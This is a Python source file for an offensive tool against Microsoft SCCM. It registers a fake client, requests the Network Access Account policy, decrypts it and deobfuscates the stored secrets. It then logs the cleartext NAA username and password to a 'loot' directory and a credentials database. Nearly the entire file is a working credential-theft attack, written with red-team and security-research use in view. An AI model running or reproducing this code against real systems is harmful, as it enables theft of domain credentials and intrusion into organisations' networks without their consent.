import datetime
import zlib
import requests
import re
import time
import os
import pandas as pd
from tabulate import tabulate
from lib.logger import logger
from pyasn1.codec.der.decoder import decode
from pyasn1_modules import rfc5652
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import PublicFormat
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, ciphers, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.x509 import ObjectIdentifier
from requests_toolbelt.multipart import decoder
from requests_ntlm import HttpNtlmAuth
import xml.etree.ElementTree as ET
import sqlite3
import csv


# Who needs just 1 date format :/
dateFormat1 = "%Y-%m-%dT%H:%M:%SZ"
dateFormat2 = "%Y%m%d%H%M%S.000000+000"
dateFormat3 = "%m/%d/%Y %H:%M:%S"

now = datetime.datetime.utcnow()

# Huge thanks to @_Mayyhem with SharpSCCM for making requesting these easy!
registrationRequestWrapper = "<ClientRegistrationRequest>{data}<Signature><SignatureValue>{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"
registrationRequest = """<Data HashAlgorithm="1.2.840.113549.1.1.11" SMSID="" RequestType="Registration" TimeStamp="{date}"><AgentInformation AgentIdentity="CCMSetup.exe" AgentVersion="5.00.8325.0000" AgentType="0" /><Certificates><Encryption Encoding="HexBinary" KeyType="1">{encryption}</Encryption><Signing Encoding="HexBinary" KeyType="1">{signature}</Signing></Certificates><DiscoveryProperties><Property Name="Netbios Name" Value="{client}" /><Property Name="FQ Name" Value="{clientfqdn}" /><Property Name="Locale ID" Value="2057" /><Property Name="InternetFlag" Value="0" /></DiscoveryProperties></Data>"""
msgHeader = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{5DD100CD-DF1D-45F5-BA17-A327F43465F8}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
msgHeaderPolicy = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
policyBody = """<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType="Always"><Identification><Machine><ClientID>GUID:{clientid}</ClientID><FQDN>{clientfqdn}</FQDN><NetBIOSName>{client}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:PRI</PolicySource><Resource ResourceType="Machine" /><ServerCookie /></RequestAssignments>"""
reportBody = """<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>850</CodePage><SystemDefaultLCID>2057</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><ReportBody /></Report>"""

class Tools:
  @staticmethod
  def encode_unicode(input):
    # Remove the BOM
    return input.encode('utf-16')[2:]

  @staticmethod
  def write_to_file(input, file):
    with open(file, "w", encoding='utf-8') as fd:
      fd.write(input)
  
  @staticmethod
  def write_to_csv(input, logs_dir):
      fields = ["username", "password"]
      file = f"{logs_dir}/csvs/naa_creds.csv"
      with open(file, 'a', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=fields, escapechar='\\')
            writer.writeheader()
            writer.writerows(input)
      logger.info(f"[+] NAA credentials saved to {file}")



class CryptoTools:
    @staticmethod
    def createCertificateForKey(key, cname):
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, cname),
        ])
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow() - datetime.timedelta(days=2)
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.KeyUsage(digital_signature=True, key_encipherment=False, key_cert_sign=False,
                                  key_agreement=False, content_commitment=False, data_encipherment=True,
                                  crl_sign=False, encipher_only=False, decipher_only=False),
            critical=False,
        ).add_extension(
            # SMS Signing Certificate (Self-Signed)
            x509.ExtendedKeyUsage([ObjectIdentifier("1.3.6.1.4.1.311.101.2"), ObjectIdentifier("1.3.6.1.4.1.311.101")]),
            critical=False,
        ).sign(key, hashes.SHA256())

        return cert

    @staticmethod
    def generateRSAKey():
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        return key

    @staticmethod
    def buildMSPublicKeyBlob(key):
        # Built from spec: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/ade9efde-3ec8-4e47-9ae9-34b64d8081bb
        blobHeader = b"\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31\x00\x08\x00\x00\x01\x00\x01\x00"
        blob = blobHeader + key.public_key().public_numbers().n.to_bytes(int(key.key_size / 8), byteorder="little")
        return blob.hex().upper()

    # Signs data using SHA256 and then reverses the byte order as per SCCM
    @staticmethod
    def sign(key, data):
        signature = key.sign(data, PKCS1v15(), hashes.SHA256())
        signature_rev = bytearray(signature)
        signature_rev.reverse()
        return bytes(signature_rev)

    # Same for now, but hints in code that some sigs need to have the hash type removed
    @staticmethod
    def signNoHash(key, data):
        signature = key.sign(data, PKCS1v15(), hashes.SHA256())
        signature_rev = bytearray(signature)
        signature_rev.reverse()
        return bytes(signature_rev)

    @staticmethod
    def decrypt(key, data):
        print(key.decrypt(data, PKCS1v15()))

    @staticmethod
    def decrypt3Des(key, encryptedKey, iv, data):
        desKey = key.decrypt(encryptedKey, PKCS1v15())

        cipher = Cipher(algorithms.TripleDES(desKey), modes.CBC(iv))
        decryptor = cipher.decryptor()
        return decryptor.update(data) + decryptor.finalize()

class SCCMTools():

    def __init__(self, target_name, target_fqdn, target_sccm, target_username, target_password, sleep, logs_dir):
        self._server = target_sccm
        self._serverURI = f"http://{self._server}"
        self._target_name = target_name
        self._target_fqdn = target_fqdn
        self.target_username = target_username
        self.target_password = target_password
        self.sleep = sleep
        self.logs_dir = logs_dir

    def sendCCMPostRequest(self, data, auth=False, username="", password="", mp = ""):
        headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender",
            "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
        }

        #for manual retrieval
        if mp:
            self._serverURI = mp
        if auth:
            r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system_windowsauth/request", headers=headers, data=data, auth=HttpNtlmAuth(username, password))
        else:
            r = self.sendCCMPostRequestWithOutAuth(data, headers)
        if r:
            multipart_data = decoder.MultipartDecoder.from_response(r)
            for part in multipart_data.parts:
                if part.headers[b'content-type'] == b'application/octet-stream':
                    return zlib.decompress(part.content).decode('utf-16')
                else:
                    pass

            
    def sendCCMPostRequestWithOutAuth(self, data, headers):
        r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system/request", headers=headers, data=data)
        #check if the response actually has a body, if not sleep and try again
        if r.headers.get('Content-Length') == "0":
            logger.info(f"[*] Policy isn't ready yet, sleeping {self.sleep} seconds.")
            time.sleep(5)
            return self.sendCCMPostRequestWithOutAuth(data, headers)
        else:
            logger.debug("[*] Policy available, decoding")
            multipart_data = decoder.MultipartDecoder.from_response(r)
            for part in multipart_data.parts:
                if part is not None and part.headers[b'content-type'] == b'application/octet-stream':
                    try:
                        decompressed = zlib.decompress(part.content).decode('utf-16')
                        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", decompressed, re.DOTALL + re.MULTILINE)
                        if result:

                            return r
                    except Exception as e:
                        print(e)

    

    def requestPolicy(self, url, clientID="", authHeaders=False, retcontent=False, key=""):
        headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender"
        }

        if authHeaders == True:
          headers["ClientToken"] = "GUID:{};{};2".format(
            clientID, 
            now.strftime(dateFormat1)
          )
          #for manual retrieval
          if key:
              self.key = key
          headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
        r = requests.get(f"{self._serverURI}"+url, headers=headers)
        if retcontent == True:
          return r.content
        else:
          return r.text

    def createCertificate(self, writeToTmp=False):
        self.key = CryptoTools.generateRSAKey()
        self.cert = CryptoTools.createCertificateForKey(self.key, u"ConfigMgr Client")


        if writeToTmp:
            #with open("/tmp/key.pem", "wb") as f:
            with open(f"{os.getcwd()}/key.pem", "wb") as f:
                f.write(self.key.private_bytes(
                    encoding=serialization.Encoding.PEM, 
                    format=serialization.PrivateFormat.TraditionalOpenSSL, 
                    encryption_algorithm=serialization.BestAvailableEncryption(b"mimikatz"),
                ))

            with open(f"{os.getcwd()}/certificate.pem", "wb") as f:
                f.write(self.cert.public_bytes(serialization.Encoding.PEM))

    def sendRegistration(self, name, fqname, username, password):
        b = self.cert.public_bytes(serialization.Encoding.DER).hex().upper()

        embedded = registrationRequest.format(
          date=now.strftime(dateFormat1), 
          encryption=b, 
          signature=b, 
          client=name, 
          clientfqdn=fqname
        )

        signature = CryptoTools.sign(self.key, Tools.encode_unicode(embedded)).hex().upper()
        request = Tools.encode_unicode(registrationRequestWrapper.format(data=embedded, signature=signature)) + "\r\n".encode('ascii')

        header = msgHeader.format(
          bodylength=len(request)-2, 
          client=name, 
          date=now.strftime(dateFormat1), 
          sccmserver=self._server
        )

        data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + zlib.compress(request) + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

        deflatedData = self.sendCCMPostRequest(data, True, username, password)
        r = re.findall("SMSID=\"GUID:([^\"]+)\"", deflatedData)
        if r != None:
            return r[0]

        return None

    def sendPolicyRequest(self, name, fqname, uuid, targetName, targetFQDN, targetUUID):
        body = Tools.encode_unicode(policyBody.format(clientid=targetUUID, clientfqdn=targetFQDN, client=targetName)) + b"\x00\x00\r\n"
        payloadCompressed = zlib.compress(body)

        bodyCompressed = zlib.compress(body)
        public_key = CryptoTools.buildMSPublicKeyBlob(self.key)
        clientID = f"GUID:{uuid.upper()}"
        clientIDSignature = CryptoTools.sign(self.key, Tools.encode_unicode(clientID) + "\x00\x00".encode('ascii')).hex().upper()
        payloadSignature = CryptoTools.sign(self.key, bodyCompressed).hex().upper()

        header = msgHeaderPolicy.format(
          bodylength=len(body)-2, 
          sccmserver=self._server, 
          client=name, 
          publickey=public_key, 
          clientIDsignature=clientIDSignature, 
          payloadsignature=payloadSignature, 
          clientid=uuid, 
          date=now.strftime(dateFormat1)
        )

        data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + bodyCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

        with open (f"{self.logs_dir}/{uuid}.data", "wb") as f:
            f.write(data)
        deflatedData = self.sendCCMPostRequest(data)
        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
        return [result.group(1)]


    def parseEncryptedPolicy(self, result):
        # Man.. asn1 suxx!
        content, rest = decode(result, asn1Spec=rfc5652.ContentInfo())
        content, rest = decode(content.getComponentByName('content'), asn1Spec=rfc5652.EnvelopedData())
        encryptedRSAKey = content['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
        iv = content['encryptedContentInfo']['contentEncryptionAlgorithm']['parameters'].asOctets()[2:]
        body = content['encryptedContentInfo']['encryptedContent'].asOctets()

        decrypted = CryptoTools.decrypt3Des(self.key, encryptedRSAKey, iv, body)
        policy = decrypted.decode('utf-16')
        return policy
    
    def rename_key(self, uuid):
       key = f"{os.getcwd()}/key.pem"
               # with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
        #     key = g.read()
       newkey = f"{self.logs_dir}/{uuid}.pem"
       if uuid:
          os.rename(key, newkey)


#### Huge shoutout to @SkelSec for this code
#### https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.py

    def mscrypt_derive_key_sha1(self, secret:bytes):
        # Implementation of CryptDeriveKey(prov, CALG_3DES, hash, 0, &cryptKey);
        buf1 = bytearray([0x36] * 64)
        buf2 = bytearray([0x5C] * 64)

        digest = hashes.Hash(hashes.SHA1(), backend=default_backend())
        digest.update(secret)
        hash_ = digest.finalize()

        for i in range(len(hash_)):
            buf1[i] ^= hash_[i]
            buf2[i] ^= hash_[i]

        digest1 = hashes.Hash(hashes.SHA1(), backend=default_backend())
        digest1.update(buf1)
        hash1 = digest1.finalize()

        digest2 = hashes.Hash(hashes.SHA1(), backend=default_backend())
        digest2.update(buf2)
        hash2 = digest2.finalize()

        derived_key = hash1 + hash2[:4]
        return derived_key

    def deobfuscate_policysecret(self, output:str or bytes):
        if isinstance(output, str):
            output = bytes.fromhex(output)

        data_length = int.from_bytes(output[52:56], 'little')
        buffer = output[64:64+data_length]

        key = self.mscrypt_derive_key_sha1(output[4:4+0x28])
        iv = bytes([0] * 8)
        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(buffer) + decryptor.finalize()

        padder = padding.PKCS7(64).unpadder() # 64 is the block size in bits for DES3
        decrypted_data = padder.update(decrypted_data) + padder.finalize()
        return decrypted_data


    def parse_xml(self, xml_file):
        try:
            #might need to update this if the weird extra character isn't consistent from the file write

            index = xml_file.find("</Policy>")
            if index != -1:
                clean = xml_file[:index + len("</Policy>")]

            i = ET.fromstring(clean)
            for instance in i.findall(".//instance[@class='CCM_NetworkAccessAccount']"):
                network_access_username = instance.find(".//property[@name='NetworkAccessUsername']/value").text
                network_access_password = instance.find(".//property[@name='NetworkAccessPassword']/value").text
                clear_user = self.deobfuscate_policysecret(network_access_username).decode('utf-16-le')
                clear_pass = self.deobfuscate_policysecret(network_access_password).decode('utf-16-le')
                logger.info("[+] Got NAA credential: " + clear_user + ":" + clear_pass)
                self.write_to_db(clear_user, clear_pass)
            #Tools.write_to_csv(cred_dict, self.logs_dir)

        except ET.ParseError as e:
            print(f"An error occurred while parsing the XML: {e}")
        except Exception as e:
            print(e)
        # cursor.execute(f'''insert into SiteServers (Hostname, SiteCode, SigningStatus, SiteServer, Active, Passive, MSSQL) values (?,?,?,?,?,?,?)''',
        #                 (result, '', '', 'True', '', '', '')) 

    def write_to_db(self, username, password):
        source = "HTTP NAA"
        database = f"{self.logs_dir}/db/find.db"
        conn = sqlite3.connect(database, check_same_thread=False)
        cursor = conn.cursor()
        check = "select * from Creds where Username = ?"
        cursor.execute(check, (username,))
        exists = cursor.fetchone()
        if not exists:
            cursor.execute(f'''insert into Creds (Username, Password, Source) values (?,?,?)''', (username, password, source))
            conn.commit()
        return
    
    
    def sccmwtf_run(self):

        logger.debug("[*] Creating certificate for our fake server...")

        self.createCertificate(True)
        
        logger.debug("[*] Registering our fake server...")
        uuid = self.sendRegistration(self._target_name, self._target_fqdn, self.target_username, self.target_password)

        self.rename_key(uuid)
        logger.info(f"[*] Done.. our ID is {uuid}")



        # If too quick, SCCM requests fail (DB error, jank!)
        logger.info(f"[*] Waiting {self.sleep} seconds for database to update.")
        time.sleep(self.sleep)

        logger.debug("[*] Requesting NAAPolicy.. 2 secs")

        urls = self.sendPolicyRequest(self._target_name, self._target_fqdn, uuid, self._target_name, self._target_fqdn, uuid)

        logger.debug("[*] Parsing for Secretz...")

        for url in urls:
            result = self.requestPolicy(url)
            if result.startswith("<HTML>"):
                try:
                    result = self.requestPolicy(url, uuid, True, True)
                    decryptedResult = self.parseEncryptedPolicy(result)
                    self.parse_xml(decryptedResult)
                    file_name = f"{self.logs_dir}/loot/naapolicy.xml"
                    Tools.write_to_file(decryptedResult, file_name)
                    logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/naapolicy.xml")
                    return True
                except:
                    logger.info(f"[-] Something went wrong.")
        return False
                
        
 